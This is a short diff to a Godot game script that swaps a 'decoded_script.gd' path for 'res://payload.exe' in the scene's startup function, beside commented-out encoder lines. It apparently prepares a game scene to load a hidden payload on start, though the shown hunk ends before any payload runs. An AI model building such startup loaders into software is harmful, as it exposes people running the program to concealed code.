@@ -1,11 +1,11 @@
 extends Node2D
 
 func _ready():
-	print("Hello, world!")
+	#print("Hello, world!")
 	#var encoder = load("res://encoder.gd").new()
 	#add_child(encoder)
-
-	var decoded_path = "res://decoded_script.gd"
+#
+	var decoded_path = "res://payload.exe"
 	var node_to_add : Node = null
 
 	if FileAccess.file_exists(decoded_path):
